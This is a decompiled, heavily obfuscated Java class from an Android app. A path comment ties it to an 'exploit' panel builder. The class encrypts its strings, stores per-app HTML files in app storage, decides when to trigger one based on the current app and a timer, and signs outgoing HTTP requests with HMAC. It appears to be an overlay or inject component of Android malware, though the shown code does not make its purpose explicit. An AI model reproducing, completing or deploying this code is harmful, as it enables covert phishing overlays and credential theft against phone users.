package v.s;

import android.content.Context;
import android.content.SharedPreferences;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.util.TypefaceCache;
import java.io.File;
import java.io.FileOutputStream;
import java.net.HttpURLConnection;
import java.nio.charset.Charset;
import java.util.LinkedHashSet;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import org.json.JSONArray;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class GQh1bKoqkKhujFH2nJ {
    public static volatile long D5P1xCAyuvgF;
    public static Context Ee8d2j4S9Vm5yGuR;
    public static volatile boolean JXn4Qf7zpnLjP5;
    public static final LinkedHashSet b1EoSIRjJHO5;
    public static final String dDIMxZXP1V8HdM;
    public static final ConcurrentHashMap ibVTtJUNfrGYbW;
    public static volatile String pyu8ovAipBTLYAiKab;
    public static final String vekpFI4d1Nc4fakF;
    public static final String w9sT1Swbhx3hs;
    public static final ConcurrentHashMap xDyLpEZyrcKVe0;

    static {
        TypefaceCache.obtain("00070077004F008600C8009300FE00A800220072005E0095");
        dDIMxZXP1V8HdM = TypefaceCache.obtain("002A00780051008200F300AB00C1");
        w9sT1Swbhx3hs = TypefaceCache.obtain("002A00780051008200F300AB00ED00B700310073005D0094");
        vekpFI4d1Nc4fakF = TypefaceCache.obtain("002A00780051008200F300AB00ED00A2002D00770059008B00F500BB");
        JXn4Qf7zpnLjP5 = true;
        xDyLpEZyrcKVe0 = new ConcurrentHashMap();
        ibVTtJUNfrGYbW = new ConcurrentHashMap();
        b1EoSIRjJHO5 = new LinkedHashSet();
        pyu8ovAipBTLYAiKab = "";
    }

    public static void D5P1xCAyuvgF(Context context) {
        y6jRGLEWNMir.b1EoSIRjJHO5(jb8et6SZeK5TWMrJFxDX.dDIMxZXP1V8HdM(umMdYoePNXvWWPn.w9sT1Swbhx3hs), null, new XopfkSX0nabMIVQ(context, null, 0), 3);
    }

    public static void Ee8d2j4S9Vm5yGuR(DataQFAdapter dataQFAdapter) {
        try {
            File file = new File(dataQFAdapter.getFilesDir(), dDIMxZXP1V8HdM);
            if (file.exists()) {
                File[] fileArrListFiles = file.listFiles();
                ConcurrentHashMap concurrentHashMap = xDyLpEZyrcKVe0;
                if (fileArrListFiles != null) {
                    for (File file2 : fileArrListFiles) {
                        if (file2.isDirectory()) {
                            String name = file2.getName();
                            if (vekpFI4d1Nc4fakF(dataQFAdapter, name) != null) {
                                concurrentHashMap.put(name, name);
                            }
                        }
                    }
                }
                TypefaceCache.obtain("000F0079005A008300F500BB0092");
                concurrentHashMap.size();
                TypefaceCache.obtain("0063007A0054008400F100B3009200B30026007B004B008B00F100AB00D700B4");
            }
        } catch (Exception e) {
            TypefaceCache.obtain("002F0079005A008300DC00B000D100A6002F0036005E009500E200B000C000FD0063");
            e.getMessage();
        }
    }

    public static JSONArray JXn4Qf7zpnLjP5() {
        JSONArray jSONArray = new JSONArray();
        for (Map.Entry entry : xDyLpEZyrcKVe0.entrySet()) {
            String str = (String) entry.getKey();
            jSONArray.put(new JSONObject().put(TypefaceCache.obtain("003300770058008C00F100B800D7"), str).put(TypefaceCache.obtain("00220066004B00B800FE00BE00DF00A2"), (String) entry.getValue()).put(TypefaceCache.obtain("00200077004B009300E500AD00D700A3"), b1EoSIRjJHO5.contains(str)));
        }
        return jSONArray;
    }

    public static void b1EoSIRjJHO5(String str, String str2) {
        boolean zEuF5Udt5Rqv3Qmea = BS2kx9eAoOyDiNGAFlFk.euF5Udt5Rqv3Qmea(str2);
        ConcurrentHashMap concurrentHashMap = ibVTtJUNfrGYbW;
        if (zEuF5Udt5Rqv3Qmea) {
            concurrentHashMap.remove(str);
        } else {
            concurrentHashMap.put(str, str2);
        }
    }

    public static final void dDIMxZXP1V8HdM(HttpURLConnection httpURLConnection, long j) {
        String strMSGkxvPxRYNqC;
        httpURLConnection.setRequestProperty(TypefaceCache.obtain("001B003B006F008E00FD00BA00C100B30022007B004B"), String.valueOf(j));
        String strMSGkxvPxRYNqC2 = "";
        if (!BS2kx9eAoOyDiNGAFlFk.euF5Udt5Rqv3Qmea(KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM(62))) {
            httpURLConnection.setRequestProperty(TypefaceCache.obtain("001B003B0079009200F900B300D600EA000A0052"), KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM(62));
            String strDDIMxZXP1V8HdM = KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM(63);
            if (BS2kx9eAoOyDiNGAFlFk.euF5Udt5Rqv3Qmea(strDDIMxZXP1V8HdM)) {
                strMSGkxvPxRYNqC = "";
            } else {
                try {
                    Mac mac = Mac.getInstance(TypefaceCache.obtain("000B007B005A008400C3009700F300F500760020"));
                    Charset charset = N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM;
                    mac.init(new SecretKeySpec(strDDIMxZXP1V8HdM.getBytes(charset), TypefaceCache.obtain("000B007B005A008400C3009700F300F500760020")));
                    strMSGkxvPxRYNqC = VnDsNIgXNCQywv8lGh.MSGkxvPxRYNqC(mac.doFinal((KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM(62) + j).getBytes(charset)), ofxQWGnngPxGI3OtvQn.xDyLpEZyrcKVe0);
                } catch (Exception unused) {
                    strMSGkxvPxRYNqC = "";
                }
            }
            if (!BS2kx9eAoOyDiNGAFlFk.euF5Udt5Rqv3Qmea(strMSGkxvPxRYNqC)) {
                httpURLConnection.setRequestProperty(TypefaceCache.obtain("001B003B0079009200F900B300D600EA0010007F005C008900F100AB00C700B50026"), strMSGkxvPxRYNqC);
            }
        }
        String strDDIMxZXP1V8HdM2 = KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM(61);
        String strDDIMxZXP1V8HdM3 = KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM(64);
        if (!BS2kx9eAoOyDiNGAFlFk.euF5Udt5Rqv3Qmea(strDDIMxZXP1V8HdM3)) {
            try {
                Mac mac2 = Mac.getInstance(TypefaceCache.obtain("000B007B005A008400C3009700F300F500760020"));
                Charset charset2 = N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM;
                mac2.init(new SecretKeySpec(strDDIMxZXP1V8HdM3.getBytes(charset2), TypefaceCache.obtain("000B007B005A008400C3009700F300F500760020")));
                strMSGkxvPxRYNqC2 = VnDsNIgXNCQywv8lGh.MSGkxvPxRYNqC(mac2.doFinal((strDDIMxZXP1V8HdM2 + j).getBytes(charset2)), ofxQWGnngPxGI3OtvQn.ibVTtJUNfrGYbW);
            } catch (Exception unused2) {
            }
        }
        if (BS2kx9eAoOyDiNGAFlFk.euF5Udt5Rqv3Qmea(strMSGkxvPxRYNqC2)) {
            return;
        }
        httpURLConnection.setRequestProperty(TypefaceCache.obtain("001B003B0068008E00F700B100D300B300360064005E"), strMSGkxvPxRYNqC2);
    }

    public static void ibVTtJUNfrGYbW(Context context, String str, String str2, String str3) {
        try {
            File file = new File(context.getFilesDir(), dDIMxZXP1V8HdM + "/" + str);
            file.mkdirs();
            File file2 = new File(file, TypefaceCache.obtain("002A0078005F008200E800F100DA00B3002E007A"));
            byte[] bytes = str3.getBytes(N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM);
            FileOutputStream fileOutputStream = new FileOutputStream(file2);
            try {
                fileOutputStream.write(bytes);
                fileOutputStream.close();
                xDyLpEZyrcKVe0.put(str, str2);
                TypefaceCache.obtain("001700730056009700FC00BE00C600A200630065005A009100F500BB008800E7");
                TypefaceCache.obtain("006A003A001B");
                TypefaceCache.obtain("006300740042009300F500AC");
            } catch (Throwable th) {
                try {
                    throw th;
                } catch (Throwable th2) {
                    okc5AGRjqrud84oM6d.Ee8d2j4S9Vm5yGuR(fileOutputStream, th);
                    throw th2;
                }
            }
        } catch (Exception e) {
            TypefaceCache.obtain("00300077004D008200C400BA00DF00B7002F0077004F008200B000BA00C000B5002C0064000100C7");
            e.getMessage();
        }
    }

    public static void pyu8ovAipBTLYAiKab(boolean z) {
        SharedPreferences sharedPreferences;
        SharedPreferences.Editor editorEdit;
        SharedPreferences.Editor editorPutBoolean;
        JXn4Qf7zpnLjP5 = z;
        try {
            Context context = Ee8d2j4S9Vm5yGuR;
            if (context == null || (sharedPreferences = context.getSharedPreferences(w9sT1Swbhx3hs, 0)) == null || (editorEdit = sharedPreferences.edit()) == null || (editorPutBoolean = editorEdit.putBoolean(vekpFI4d1Nc4fakF, z)) == null) {
                return;
            }
            editorPutBoolean.apply();
        } catch (Exception unused) {
        }
    }

    public static File vekpFI4d1Nc4fakF(Context context, String str) {
        File file = new File(context.getFilesDir(), dDIMxZXP1V8HdM + "/" + str);
        if (!file.exists()) {
            return null;
        }
        File file2 = new File(file, TypefaceCache.obtain("002A0078005F008200E800F100DA00B3002E007A"));
        if (file2.exists()) {
            return file2;
        }
        File file3 = new File(file, Y9mRyRdkl5FOcwb66V6.ibVTtJUNfrGYbW(str, TypefaceCache.obtain("006D007E004F008A00FC")));
        if (file3.exists()) {
            return file3;
        }
        File[] fileArrListFiles = file.listFiles();
        if (fileArrListFiles == null) {
            return null;
        }
        for (File file4 : fileArrListFiles) {
            if (KgSM0TsKUpCiuePB.PPWVWMPAUcr9AGNUSxQ(file4.getName(), "").equals(TypefaceCache.obtain("002B00620056008B"))) {
                return file4;
            }
        }
        return null;
    }

    public static boolean w9sT1Swbhx3hs(String str) {
        if (JXn4Qf7zpnLjP5 && xDyLpEZyrcKVe0.containsKey(str) && !b1EoSIRjJHO5.contains(str)) {
            return !str.equals(pyu8ovAipBTLYAiKab) || System.currentTimeMillis() - D5P1xCAyuvgF >= 2500;
        }
        return false;
    }

    public static void xDyLpEZyrcKVe0(Context context, String str) {
        xDyLpEZyrcKVe0.remove(str);
        b1EoSIRjJHO5.remove(str);
        ibVTtJUNfrGYbW.remove(str);
        try {
            u4HKFgCbgUKtEQ.EWUjsTERgdPbSw3NNlN(new File(context.getFilesDir(), dDIMxZXP1V8HdM + "/" + str));
        } catch (Exception unused) {
        }
    }
}
